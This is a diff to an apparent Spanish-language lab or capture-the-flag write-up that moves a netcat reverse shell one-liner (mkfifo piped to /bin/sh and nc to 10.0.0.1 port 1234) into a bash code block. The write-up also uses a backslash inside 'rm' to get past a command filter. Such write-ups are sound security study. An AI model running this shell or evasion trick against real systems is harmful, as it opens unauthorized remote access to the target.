@@ -166,7 +166,9 @@ Nos metemos y podemos listar comandos.
 
 Intentamos ejecutar una reverse shell pero no nos deja de forma directa. Desde la web de <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey</a> usaremos la de Netcat ya que añadiendo \ entre la r y la m al principio de la reverse shell si que se lleva a cabo:
 
-> r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+```bash
+r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+```
 
 Mientras tanto desde nuestro equipo nos ponemos en escucha por el puerto indicado en la reverse shell:
 
